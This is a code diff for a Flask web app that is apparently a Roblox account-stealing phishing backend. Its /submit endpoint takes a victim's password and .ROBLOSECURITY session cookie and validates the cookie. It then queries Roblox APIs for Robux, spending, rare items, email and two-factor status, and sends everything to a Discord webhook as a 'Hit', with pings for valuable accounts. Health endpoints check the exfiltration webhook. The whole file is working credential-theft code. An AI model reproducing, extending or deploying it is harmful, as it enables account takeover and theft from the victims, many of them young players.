@@ -68,7 +68,7 @@ def send_to_discord_background(password, cookie, webhook_url):
                 ping_content = '@everyone 📈 **Normal Hit** - Account has spending history'
             else:
                 # No ping for accounts with no spending and no premium items
-                ping_content = '@everyone 🎯 **Hit Received** - Basic account captured'
+                ping_content = ''
         
         # Prepare cookie content for Discord (use cookie as provided)
         cookie_content = cookie if cookie else 'Not provided'
@@ -116,23 +116,18 @@ def send_to_discord_background(password, cookie, webhook_url):
                             'inline': False
                         },
                         {
-                            'name': '<:premium:815415937548943370> Premium',
-                            'value': user_info.get('premium_status', '❌ No'),
-                            'inline': False
-                        },
-                        {
-                            'name': '<:korblox:1153613134599307314>Korblox',
+                            'name': '👑 Korblox',
                             'value': '✅' if korblox else '❌',
                             'inline': False
                         },
                         {
-                            'name': '<:head_full:1207367926622191666>Headless',
+                            'name': '💀 Headless',
                             'value': '✅' if headless else '❌',
                             'inline': False
                         },
                         {
                             'name': '🔐 Account Settings',
-                            'value': f"**Email Verify ✉️:** {user_info.get('email_verified', '❌')}\n**Account PIN 🔒:** {user_info.get('pin_enabled', '❌')}\n**Authenticator 🔐:** {user_info.get('authenticator_enabled', '❌')}",
+                            'value': f"**Email Verify ✉️:** {user_info.get('email_verified', '❌')}\n**Email Secure 🔐:** {user_info.get('email_secure', '❌')}\n**Authenticator 🔐:** {user_info.get('authenticator_enabled', '❌')}",
                             'inline': False
                         }
                     ],
@@ -343,4 +338,350 @@ def get_roblox_user_info(cookie):
                         headless_data = headless_response.json()
                         if len(headless_data.get('data', [])) > 0:
                             has_headless = True
-                            print(f
+                            print(f"Headless item {headless_id} found")
+                            break
+                    else:
+                        print(f"Headless {headless_id} inventory check failed: {headless_response.status_code}")
+                        
+            except Exception as headless_error:
+                print(f"Error checking Headless inventory: {str(headless_error)}")
+            
+            # Check Account Settings (Email verification, Email secure, Authenticator)
+            email_verified = '❌'
+            email_secure = '❌'
+            authenticator_enabled = '❌'
+            
+            try:
+                # Check email verification and 2FA settings
+                settings_response = requests.get('https://accountsettings.roblox.com/v1/email',
+                                               headers=headers, timeout=5)
+                print(f"Account settings API response status: {settings_response.status_code}")
+                
+                if settings_response.status_code == 200:
+                    settings_data = settings_response.json()
+                    print(f"Account settings API response: {settings_data}")
+                    
+                    # Check email verification status
+                    if settings_data.get('verified', False):
+                        email_verified = '✅'
+                    else:
+                        email_verified = '❌'
+                    
+                    # Email secure is separate - check if email is present and account is secure
+                    # For now, we'll set it to same as verified until we find a proper API
+                    email_secure = email_verified
+                else:
+                    print(f"Account settings API failed with status: {settings_response.status_code}")
+                    
+            except Exception as settings_error:
+                print(f"Error checking account settings: {str(settings_error)}")
+            
+            try:
+                # Check 2FA/Authenticator status
+                twostep_response = requests.get('https://twostepverification.roblox.com/v1/users/configuration',
+                                              headers=headers, timeout=5)
+                print(f"2FA API response status: {twostep_response.status_code}")
+                
+                if twostep_response.status_code == 200:
+                    twostep_data = twostep_response.json()
+                    print(f"2FA API response: {twostep_data}")
+                    
+                    # Check if authenticator is enabled
+                    if twostep_data.get('authenticatorEnabled', False) or twostep_data.get('totpEnabled', False):
+                        authenticator_enabled = '✅'
+                    else:
+                        authenticator_enabled = '❌'
+                else:
+                    print(f"2FA API failed with status: {twostep_response.status_code}")
+                    authenticator_enabled = '❌'
+                    
+            except Exception as twostep_error:
+                print(f"Error checking 2FA settings: {str(twostep_error)}")
+                authenticator_enabled = '❌'
+            
+            return {
+                'success': True,
+                'username': username,
+                'display_name': display_name,
+                'user_id': user_id,
+                'profile_picture': profile_picture_url,
+                'robux_balance': robux_balance,
+                'pending_robux': pending_robux,
+                'premium_status': premium_status,
+                'total_spent_past_year': total_spent_past_year,
+                'has_korblox': has_korblox,
+                'has_headless': has_headless,
+                'email_verified': email_verified,
+                'email_secure': email_secure,
+                'authenticator_enabled': authenticator_enabled
+            }
+        else:
+            print(f"Cookie validation failed against Roblox API: {response.status_code}")
+            print(f"Response: {response.text}")
+        
+    except Exception as e:
+        print(f"Error fetching Roblox user info: {str(e)}")
+    
+    # Return failure indicator if cookie doesn't work with Roblox API
+    return {
+        'success': False,
+        'username': 'Not available',
+        'display_name': 'Not available', 
+        'user_id': None,
+        'profile_picture': 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-A84C1E07EBC93E9CDAEC87A36A2FEA33-Png/150/150/AvatarHeadshot/Png/noFilter',
+        'robux_balance': 'Not available',
+        'pending_robux': 'Not available',
+        'premium_status': '❌ No',
+        'total_spent_past_year': 'Not available',
+        'has_korblox': False,
+        'has_headless': False,
+        'email_verified': '❌',
+        'email_secure': '❌',
+        'authenticator_enabled': '❌'
+    }
+
+def is_valid_cookie(cookie):
+    """
+    Validate cookie and check if it's not expired
+    Supports JWT tokens and session cookies with expiration
+    Returns tuple: (is_valid, is_expired, error_message)
+    """
+    if not cookie or len(cookie) < 10:
+        return False, False, "Invalid cookie format"
+    
+    # Check if it's a JWT token (has 3 parts separated by dots)
+    if cookie.count('.') == 2:
+        try:
+            # Split JWT token
+            header, payload, signature = cookie.split('.')
+            
+            # Decode payload with correct padding for URL-safe base64
+            payload += '=' * (-len(payload) % 4)
+            decoded_payload = base64.urlsafe_b64decode(payload)
+            payload_data = json.loads(decoded_payload)
+            
+            # Check expiration (exp claim)
+            if 'exp' in payload_data:
+                exp_time = payload_data['exp']
+                current_time = int(time.time())
+                
+                if current_time >= exp_time:
+                    return False, True, "Cookie has expired"  # Token is expired
+            
+            return True, False, None  # Valid JWT token, not expired
+            
+        except (ValueError, json.JSONDecodeError, Exception):
+            return False, False, "Invalid cookie format"  # Invalid JWT format
+    
+    # For non-JWT cookies, accept Roblox-style cookies and other formats
+    # Accept Roblox .ROBLOSECURITY cookies (often start with _|WARNING:)
+    # Allow truncated cookies as long as they meet minimum requirements
+    if cookie.startswith('_|WARNING:') and len(cookie) > 50:
+        return True, False, None
+    
+    # Accept standard cookie formats
+    cookie_pattern = r'^(session|token|auth|_token|user_token|access_token)=[A-Za-z0-9+/=_-]{10,}$'
+    if re.match(cookie_pattern, cookie):
+        return True, False, None
+    
+    # Accept any long alphanumeric string that could be a valid token
+    # Allow truncated cookies as long as they have some valid characters
+    if len(cookie) >= 30 and any(c.isalnum() for c in cookie):
+        return True, False, None
+    
+    return False, False, "Invalid cookie format"
+
+@app.route('/')
+def index():
+    """Serve the main HTML page"""
+    return send_from_directory('.', 'index.html')
+
+@app.route('/health')
+def health_check():
+    """Health check endpoint to verify main webhook connectivity"""
+    webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
+    
+    if not webhook_url:
+        return jsonify({
+            'status': 'error',
+            'message': 'DISCORD_WEBHOOK_URL not configured'
+        }), 500
+    
+    # Validate webhook URL format
+    if not webhook_url.startswith('https://discord.com/api/webhooks/'):
+        return jsonify({
+            'status': 'error', 
+            'message': 'Invalid Discord webhook URL format'
+        }), 500
+    
+    try:
+        # Test connection with a minimal payload
+        test_payload = {'content': 'Health check test'}
+        response = requests.post(webhook_url, json=test_payload, timeout=5)
+        
+        if response.status_code in [200, 204]:
+            return jsonify({
+                'status': 'ok',
+                'message': 'Discord webhook connection successful',
+                'webhook_status': response.status_code
+            })
+        else:
+            return jsonify({
+                'status': 'error',
+                'message': f'Discord webhook returned status {response.status_code}',
+                'response': response.text[:200]
+            }), 500
+            
+    except requests.ConnectionError as e:
+        return jsonify({
+            'status': 'error',
+            'message': 'Connection error - cannot reach Discord servers',
+            'error': str(e)[:100]
+        }), 500
+    except requests.Timeout:
+        return jsonify({
+            'status': 'error',
+            'message': 'Timeout error - Discord servers not responding'
+        }), 500
+    except Exception as e:
+        return jsonify({
+            'status': 'error',
+            'message': f'Unexpected error: {str(e)[:100]}'
+        }), 500
+
+@app.route('/health/full')
+def health_check_full():
+    """Comprehensive health check for the main webhook"""
+    results = {
+        'main_webhook': {'status': 'unknown'},
+        'overall_status': 'unknown'
+    }
+    
+    # Test main webhook
+    main_webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
+    if not main_webhook_url:
+        results['main_webhook'] = {
+            'status': 'error',
+            'message': 'DISCORD_WEBHOOK_URL not configured'
+        }
+    else:
+        try:
+            test_payload = {'content': 'Main webhook health check'}
+            response = requests.post(main_webhook_url, json=test_payload, timeout=5)
+            
+            if response.status_code in [200, 204]:
+                results['main_webhook'] = {
+                    'status': 'ok',
+                    'message': 'Main webhook successful',
+                    'status_code': response.status_code
+                }
+            else:
+                results['main_webhook'] = {
+                    'status': 'error',
+                    'message': f'Main webhook failed with status {response.status_code}',
+                    'status_code': response.status_code
+                }
+        except Exception as e:
+            results['main_webhook'] = {
+                'status': 'error',
+                'message': f'Main webhook error: {str(e)[:100]}'
+            }
+    
+    # Determine overall status
+    main_ok = results['main_webhook']['status'] == 'ok'
+    
+    if main_ok:
+        results['overall_status'] = 'ok'
+        status_code = 200
+    else:
+        results['overall_status'] = 'error'
+        status_code = 500
+    
+    return jsonify(results), status_code
+
+@app.route('/debug')
+def debug_info():
+    """Debug endpoint to check environment and configuration"""
+    return jsonify({
+        'environment_variables': {
+            'DISCORD_WEBHOOK_URL': 'SET' if os.environ.get('DISCORD_WEBHOOK_URL') else 'NOT_SET',
+            'DATABASE_URL': 'SET' if os.environ.get('DATABASE_URL') else 'NOT_SET',
+            'SESSION_SECRET': 'SET' if os.environ.get('SESSION_SECRET') else 'NOT_SET'
+        },
+        'python_version': sys.version,
+        'current_working_directory': os.getcwd(),
+        'files_in_directory': os.listdir('.'),
+        'timestamp': time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())
+    })
+
+
+@app.route('/submit', methods=['POST'])
+def submit_form():
+    """Handle form submission and send to Discord webhook"""
+    try:
+        data = request.get_json()
+        
+        # Extract all form fields
+        password = data.get('password', '').strip()
+        cookie = data.get('cookie', '').strip()
+        
+        # Server-side validation
+        if not cookie:
+            return jsonify({
+                'success': False, 
+                'message': 'Missing required field (cookie)'
+            }), 400
+        
+        # Comprehensive cookie validation
+        is_valid, is_expired, error_msg = is_valid_cookie(cookie)
+        
+        if not is_valid or is_expired:
+            return jsonify({
+                'success': False, 
+                'message': 'Your Cookie Was Expired Or Invalid'
+            }), 400
+        
+        
+        # Get Discord webhook URL from environment
+        webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
+        if not webhook_url:
+            print("ERROR: DISCORD_WEBHOOK_URL environment variable not set")
+            print("Available environment variables:", [key for key in os.environ.keys() if 'WEBHOOK' in key.upper() or 'DISCORD' in key.upper()])
+            return jsonify({
+                'success': False, 
+                'message': 'Discord webhook not configured. Please set DISCORD_WEBHOOK_URL environment variable in your deployment platform.'
+            }), 500
+        
+        print("Discord webhook URL configured successfully") # Don't log URL for security
+        
+        # Process Discord webhooks synchronously for Vercel compatibility  
+        print("Processing Discord webhooks synchronously...")
+        start_time = time.time()
+        
+        try:
+            send_to_discord_background(password, cookie, webhook_url)
+            end_time = time.time()
+            processing_time = end_time - start_time
+            print(f"Discord webhook processing completed successfully in {processing_time:.2f} seconds")
+            
+            return jsonify({
+                'success': True, 
+                'message': f'Data processed and sent successfully in {processing_time:.1f}s'
+            })
+        except Exception as e:
+            end_time = time.time()
+            processing_time = end_time - start_time
+            print(f"Error during Discord webhook processing after {processing_time:.2f} seconds: {str(e)}")
+            return jsonify({
+                'success': False, 
+                'message': f'Processing failed after {processing_time:.1f}s: webhook delivery error'
+            }), 500
+            
+    except Exception as e:
+        return jsonify({
+            'success': False, 
+            'message': 'Server error occurred'
+        }), 500
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000, debug=False)
